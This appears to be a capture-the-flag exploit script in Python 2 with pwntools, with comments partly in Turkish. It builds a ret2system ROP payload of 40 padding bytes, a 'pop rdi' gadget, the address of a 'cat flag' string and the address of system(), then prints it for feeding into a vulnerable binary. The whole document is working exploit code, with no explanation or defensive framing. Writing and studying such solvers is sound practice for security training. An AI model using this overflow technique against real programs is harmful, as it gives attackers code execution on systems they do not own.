import pwn

junk = "J"*40

system = pwn.p64(0x400810) # system adress
pop_rdi = pwn.p64(0x0000000000400883) # 64 bit arguman stuff
cat_flag = pwn.p64(0x00601060) # systeme verilecek olan string

print junk + pop_rdi + cat_flag + system # once arguman koy sonra system cagır
